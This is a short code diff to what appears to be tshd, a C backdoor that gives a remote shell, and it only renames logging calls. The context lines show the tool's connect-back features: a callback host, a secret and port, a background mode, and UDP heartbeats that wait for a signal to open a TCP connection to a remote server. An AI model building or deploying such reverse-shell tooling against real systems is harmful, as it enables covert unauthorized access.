@@ -57,8 +57,8 @@ int tshd_runshell( int client );
 
 void usage(char *argv0)
 {
-    info("Usage: %s [ -c [ connect_back_host ] ] [ -s secret ] [ -p port ]\n", argv0);
-    info("Usage: %s [ -f [ forgound, backgound as default ]\n", argv0);
+    LERR("Usage: %s [ -c [ connect_back_host ] ] [ -s secret ] [ -p port ]\n", argv0);
+    LERR("Usage: %s [ -f [ forgound, backgound as default ]\n", argv0);
     exit(1);
 }
 
@@ -80,7 +80,7 @@ bool hasWaitConnectSignal(int udpSock, struct sockaddr_in *udpAddr, struct socka
 			data.type |= UPD_PAYLOAD_DATA;
 			data.length += strlen(pdata);
 		}
-		info("udp send heart beat data to %s " IPBLabel "\n", cb_host, IPBValue(*udpAddr));
+		LINFO("udp send heart beat data to %s " IPBLabel "\n", cb_host, IPBValue(*udpAddr));
 		udpSendPacketData(udpSock, udpAddr, &data, pdata);
 		lastHeartBeatTime = time(NULL);
 	}
@@ -95,7 +95,7 @@ bool hasWaitConnectSignal(int udpSock, struct sockaddr_in *udpAddr, struct socka
 	}
 
 	if (recvdata.type == UPD_PAYLOAD_DATA) {
-		info("udp recv heartbeat from type : 0x%08x, len : %d, " IPBLabel "\n",
+		LINFO("udp recv heartbeat from type : 0x%08x, len : %d, " IPBLabel "\n",
 			 recvdata.type,
 			 recvdata.length,
 			 IPBValue(udpSrvAddr));
@@ -105,7 +105,7 @@ bool hasWaitConnectSignal(int udpSock, struct sockaddr_in *udpAddr, struct socka
 #endif
 		return false;
 	} else if (recvdata.type == UPD_BACK_CONNECT) {
-		info("udp recv from type : 0x%08x, len : %d, [%d.%d.%d.%d:%d]\n",
+		LINFO("udp recv from type : 0x%08x, len : %d, [%d.%d.%d.%d:%d]\n",
 			 recvdata.type,
 			 recvdata.length,
 			 __IP3(recvdata.listen_ip), __IP2(recvdata.listen_ip),
@@ -307,7 +307,7 @@ int main( int argc, char **argv )
 					// 如果没有反向连接数据.
 					continue;
 				}
-				info("udp got tcp addr " IPBLabel " and begin to connect\n", IPBValue(sServer));
+				LINFO("udp got tcp addr " IPBLabel " and begin to connect\n", IPBValue(sServer));
 			} else {
 				sleep( CONNECT_BACK_DELAY );
 			}
